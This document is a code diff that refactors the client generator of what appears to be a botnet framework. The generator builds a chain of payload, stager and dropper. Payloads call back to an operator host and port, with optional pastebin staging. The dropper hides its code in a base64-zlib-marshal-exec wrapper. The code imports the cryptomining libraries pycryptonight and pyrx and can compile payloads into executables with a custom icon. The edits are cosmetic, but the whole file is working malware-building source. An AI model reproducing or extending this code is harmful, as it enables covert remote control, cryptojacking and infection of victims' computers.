@@ -195,8 +195,15 @@ def main():
     hidden  = _hidden (options, var=var, key=key, modules=modules, imports=imports)
     payload = _payload(options, var=var, key=key, modules=modules, imports=imports, hidden=hidden)
     stager  = _stager (options, var=var, key=key, modules=modules, imports=imports, hidden=hidden, url=payload)
-    dropper = _dropper(options, var=var, key=key, modules=modules, imports=imports, hidden=hidden, url=stager)
-    return dropper
+    return _dropper(
+        options,
+        var=var,
+        key=key,
+        modules=modules,
+        imports=imports,
+        hidden=hidden,
+        url=stager,
+    )
 
 def _update(input, output, task=None):
     diff = round(float(100.0 * float(float(len(output))/float(len(input)) - 1.0)))
@@ -245,13 +252,12 @@ def _imports(options, **kwargs):
 
     for module in kwargs['modules']:
         for line in open(module, 'r').read().splitlines():
-            if len(line.split()):
-                if line.split()[0] == 'import':
-                    for x in ['core'] + [os.path.splitext(i)[0] for i in os.listdir('core')] + ['core.%s' % s for s in [os.path.splitext(i)[0] for i in os.listdir('core')]]:
-                        if x in line:
-                            break
-                    else:
-                        imports.add(line.strip())
+            if len(line.split()) and line.split()[0] == 'import':
+                for x in ['core'] + [os.path.splitext(i)[0] for i in os.listdir('core')] + ['core.%s' % s for s in [os.path.splitext(i)[0] for i in os.listdir('core')]]:
+                    if x in line:
+                        break
+                else:
+                    imports.add(line.strip())
 
     imports = list(imports)
     if sys.platform != 'win32':
@@ -287,17 +293,40 @@ def _payload(options, **kwargs):
     assert 'var' in kwargs, "missing keyword argument 'var'"
     assert 'modules' in kwargs, "missing keyword argument 'modules'"
     assert 'imports' in kwargs, "missing keyword argument 'imports'"
-
 #    loader  = '\n'.join((open('core/loader.py','r').read(), generators.loader(host=options.host, port=int(options.port)+2, packages=list(kwargs['hidden']))))
     loader  = open('core/loader.py','r').read()
-    test_imports = '\n'.join(['import ' + i for i in list(kwargs['hidden']) if i not in ['StringIO','_winreg','pycryptonight','pyrx']])
+    test_imports = '\n'.join(
+        [
+            f'import {i}'
+            for i in list(kwargs['hidden'])
+            if i not in ['StringIO', '_winreg', 'pycryptonight', 'pyrx']
+        ]
+    )
+
     potential_imports = '''
 try:
     import pycryptonight
     import pyrx
 except ImportError: pass
 '''
-    modules = '\n'.join(([open(module,'r').read().partition('# main')[2] for module in kwargs['modules']] + [generators.main('Payload', **{"host": options.host, "port": options.port, "pastebin": options.pastebin if options.pastebin else str()}) + '_payload.run()']))
+    modules = '\n'.join(
+        [
+            open(module, 'r').read().partition('# main')[2]
+            for module in kwargs['modules']
+        ]
+        + [
+            generators.main(
+                'Payload',
+                **{
+                    "host": options.host,
+                    "port": options.port,
+                    "pastebin": options.pastebin or str(),
+                }
+            )
+            + '_payload.run()'
+        ]
+    )
+
     payload = '\n'.join((loader, test_imports, potential_imports, modules))
 
     if not os.path.isdir('modules/clients'):
@@ -346,11 +375,11 @@ except ImportError: pass
             if os.path.isdir(d):
                 dirname = d
 
-        path = os.path.join(os.path.abspath(dirname), kwargs['var'] + '.py' )
+        path = os.path.join(os.path.abspath(dirname), f'{kwargs["var"]}.py')
 
         with open(path, 'w') as fp:
             fp.write(payload)
-         
+
         s = 'http://{}:{}{}'.format(options.host, int(options.port) + 1, pathname2url(path.replace(os.path.join(os.getcwd(), 'modules'), '')))
         s = urlparse.urlsplit(s)
         url = urlparse.urlunsplit((s.scheme, s.netloc, os.path.normpath(s.path), s.query, s.fragment)).replace('\\','/')
@@ -407,7 +436,7 @@ def _stager(options, **kwargs):
             if os.path.isdir(d):
                 dirname = d
 
-        path = os.path.join(os.path.abspath(dirname), kwargs['var'] + '.py' )
+        path = os.path.join(os.path.abspath(dirname), f'{kwargs["var"]}.py')
 
         with open(path, 'w') as fp:
             fp.write(stager)
@@ -434,13 +463,13 @@ def _dropper(options, **kwargs):
             os.mkdir('modules/clients')
         except OSError:
             util.log("Permission denied: unabled to make directory './modules/clients/'")
-    
+
     if not os.path.isdir('modules/clients/droppers'):
         try:
             os.mkdir('modules/clients/droppers')
         except OSError:
             util.log("Permission denied: unabled to make directory './modules/clients/droppers/'")
-    
+
     dirs = ['modules/clients/droppers','byob/modules/clients/droppers','byob/byob/modules/clients/droppers']
     dirname = '.'
     for d in dirs:
@@ -465,7 +494,13 @@ exec(eval(marshal.loads(zlib.decompress(base64.b64decode({})))))""".format(repr(
 
     if options.freeze:
         util.display('\tCompiling executable...\n', color='reset', style='normal', end=' ')
-        name = generators.freeze('modules/clients/payloads/' + kwargs['var'] + '.py', icon=options.icon, hidden=kwargs['hidden'], debug=options.debug)
+        name = generators.freeze(
+            f'modules/clients/payloads/{kwargs["var"]}.py',
+            icon=options.icon,
+            hidden=kwargs['hidden'],
+            debug=options.debug,
+        )
+
         util.display('({:,} bytes saved to file: {})\n'.format(len(open(name, 'rb').read()), name))
     return name
 
